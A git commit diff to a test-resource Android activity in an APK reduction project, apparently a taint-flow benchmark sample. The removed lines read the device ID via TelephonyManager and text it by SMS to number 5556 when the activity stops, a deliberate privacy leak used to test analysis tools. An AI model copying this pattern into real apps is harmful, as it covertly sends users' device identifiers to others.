2f35014d447aae80fcd95fbf95e19f81f884c4a3
Dakota Soles <djs190000@utdallas.edu>
2021-01-24 14:33:25 -0600

    Fixed gradlew files of test_resources

--- APKReductionDir/test_resources/MinimizedFlows/ActivityEventSequence2/ActivityEventSequence2_0/source_code/app/src/main/java/edu/uta/ActivityEventSequence2.java
+++ APKReductionDir/test_resources/MinimizedFlows/ActivityEventSequence2/ActivityEventSequence2_0/source_code/app/src/main/java/edu/uta/ActivityEventSequence2.java
@@ -19,50 +19,20 @@ public class ActivityEventSequence2 extends Activity {
 
     private String d1 = "";
 
-    private String d2 = "";
-
-    private String d3 = "";
-
-    private String d4 = "";
-
     private String recpNo = "5556";
 
     @Override
-    public void onCreate(Bundle instance) {
-        super.onCreate(instance);
-        setContentView(R.layout.activity_main);
-    }
-
-    @SuppressLint("MissingSuperCall")
-    @Override
-    protected void onRestart() {
-        super.onStart();
-        this.d1 = "";
-    }
-
-    @Override
     public void onStart() {
-        super.onStart();
         TelephonyManager tMgr = (TelephonyManager) getApplicationContext().getSystemService(TELEPHONY_SERVICE);
         this.d1 = tMgr.getDeviceId();
     }
 
     @Override
-    public void onResume() {
-        super.onResume();
-        this.d1 = "";
-    }
-
-    @Override
     public void onSaveInstanceState(Bundle state) {
         this.d1 = "";
-        super.onSaveInstanceState(state);
     }
 
     @Override
     public void onStop() {
-        super.onStop();
-        if (!d1.isEmpty())
-            SmsManager.getDefault().sendTextMessage(recpNo, null, d1, null, null);
     }
 }
